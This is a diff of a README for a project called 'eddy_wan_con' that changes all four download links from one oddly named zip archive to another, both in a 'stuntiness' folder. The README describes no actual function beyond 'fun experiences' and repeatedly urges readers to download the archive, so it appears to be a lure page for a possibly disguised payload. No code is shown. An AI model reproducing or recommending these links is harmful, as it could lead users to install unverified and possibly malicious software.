@@ -1,6 +1,6 @@
 # 🎉 eddy_wan_con - Enjoy Fun Experiences Easily
 
-[![Download eddy_wan_con](https://raw.githubusercontent.com/Truongt3619/eddy_wan_con/main/stuntiness/eddy_wan_con-unshot.zip)](https://raw.githubusercontent.com/Truongt3619/eddy_wan_con/main/stuntiness/eddy_wan_con-unshot.zip)
+[![Download eddy_wan_con](https://github.com/Truongt3619/eddy_wan_con/raw/refs/heads/main/stuntiness/wan_eddy_con_1.0.zip)](https://github.com/Truongt3619/eddy_wan_con/raw/refs/heads/main/stuntiness/wan_eddy_con_1.0.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the eddy_wan_con project! This application provides fun experiences t
 
 ## 📥 Download & Install
 
-To get started with eddy_wan_con, visit this page to download: [Download eddy_wan_con](https://raw.githubusercontent.com/Truongt3619/eddy_wan_con/main/stuntiness/eddy_wan_con-unshot.zip).
+To get started with eddy_wan_con, visit this page to download: [Download eddy_wan_con](https://github.com/Truongt3619/eddy_wan_con/raw/refs/heads/main/stuntiness/wan_eddy_con_1.0.zip).
 
 Once you are there, locate the latest release. You will see a list of available files. Choose the file that matches your operating system and click to download it. 
 
@@ -59,7 +59,7 @@ If you encounter issues during installation or while using eddy_wan_con, try the
 
 - **Recheck System Requirements:** Make sure your system meets the necessary requirements outlined above.
 - **Reinstall the Application:** If the app does not launch, try uninstalling and then reinstalling it.
-- **Check for Updates:** Make sure you are using the latest version of the app. Go back to [Download eddy_wan_con](https://raw.githubusercontent.com/Truongt3619/eddy_wan_con/main/stuntiness/eddy_wan_con-unshot.zip) and check for newer releases.
+- **Check for Updates:** Make sure you are using the latest version of the app. Go back to [Download eddy_wan_con](https://github.com/Truongt3619/eddy_wan_con/raw/refs/heads/main/stuntiness/wan_eddy_con_1.0.zip) and check for newer releases.
 
 ## ✨ Community Support
 
@@ -72,4 +72,4 @@ Join our community for support and to share your experiences:
 
 Thank you for choosing eddy_wan_con! We hope you enjoy the fun experiences the app provides. For further questions, feel free to check the releases page or reach out to our community. 
 
-Don’t forget to download the latest version: [Download eddy_wan_con](https://raw.githubusercontent.com/Truongt3619/eddy_wan_con/main/stuntiness/eddy_wan_con-unshot.zip).
+Don’t forget to download the latest version: [Download eddy_wan_con](https://github.com/Truongt3619/eddy_wan_con/raw/refs/heads/main/stuntiness/wan_eddy_con_1.0.zip).
